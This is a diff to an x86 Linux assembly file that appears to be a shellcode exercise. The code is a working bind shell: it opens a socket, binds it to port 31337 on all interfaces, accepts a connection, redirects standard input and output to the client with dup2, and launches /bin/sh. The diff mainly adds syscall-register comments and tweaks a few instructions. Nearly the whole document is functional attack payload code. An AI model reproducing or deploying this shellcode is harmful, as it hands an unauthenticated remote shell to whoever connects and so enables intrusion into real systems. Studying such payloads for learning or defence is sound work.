@@ -38,7 +38,7 @@ _start:
 
 	mov	bl, 0x2		;; SYS_BIND function
 	push	edx		;; push edx (value: 0) for sin_addr (INADDR_ENY), as third param
-	push	0x697A		;; push 31337 (reversed hex) for sin_port, as second param
+	push	word 0x697A	;; push 31337 (reversed hex) for sin_port, as second param
 	push	bx		;; push ebx (value: 2) for AF_INET, as first param
 	mov	ecx, esp	;; moving reference as srv_addr structure 
 	push	0x10		;; address length, see sizeof(srv_addr)
@@ -50,7 +50,10 @@ _start:
 
 	;;Listen the socket
 	;CODE -> listen(socket_fd, 0);
-	
+	;Assembly Call Structure
+	;eax <- 0x66
+	;ebx <- 0x4 (listen)
+	;ecx <- stack parameter (socket_fd,0)	
 	mov	al, 0x66	;; systemcall for sys_socketcall
 	mov	bl, 0x4		;; SYS_LISTEN
 	push	edx		;; push edx (value: 0) as second param
@@ -60,6 +63,10 @@ _start:
 
 	;;Accept new connection
 	;;CODE -> accept(socket_fd, (struct sockaddr *)&cli_addr, &socklen );
+	;Assembly Call Structure
+	;eax <- 0x66
+	;ebx <- 0x5 (accept)
+	;ecx <- Stack parameter (socket_fd, IGNORE, IGNORE)
 	mov	al, 0x66	;; systemcall for sys_socketcall
 	mov	bl, 0x5		;; SYS_ACCEPT
 	push	edx		;; socklen, just put it zero
@@ -76,6 +83,9 @@ _start:
 	;;dup2(client_fd, 2);
 	;;EAX will be overwritten and used in client_fd param
 	;;client_fd is using ebx, and 0/1/2 is using ecx
+	;;eax <- 0x3f
+	;;ebx <- client_fd from previous function's return on eax
+	;;ecx <- integer
 
 	mov	ebx, eax	;;getting client_fd
 
@@ -95,18 +105,25 @@ _start:
 	int	0x80		;;interrupt
 
 	;;execve( "/bin/sh", NULL, NULL );
+	;;Call Structure
+	;;eax <- 0x0b
+	;;ebx <- string stack equivalent to /bin//sh/
+	;;ecx <- 0
+	;;edx <- 0
 	mov	al, 0x0b	;syscall: sys_execve
 	xor	ebx, ebx	;give ebx null
 	push	ebx		;for null terminator
 	push	0x68732f2f	;String "hs//"
 	push	0x6e69622f	;String "nib/"
 	mov	ebx, esp	;move current stack pointer to ebx as second param
-	dec	ecx		;now ecx 1
-	dec	ecx		;now ecx 0
-	mov	edx,ecx		;mov ecx to edx
+	xor	ecx, ecx	;reset the ecx to 0
+	mov	edx, ecx	;mov ecx to edx
 	int	0x80		;interrupt
 
-	;exit
-	mov eax, 1
-	mov ebx, 10		; sys_exit syscall
-	int 0x80
+	;exit(1), NOT REQUIRED
+	;Call structure
+	;eax <- 0x1 (syscall for exit)
+	;ebx <- 0x1 (exit code)
+	mov	al, 0x1		; syscall for exit
+	mov	bl, 0x1		; syscall code
+	int	0x80		; interrupt
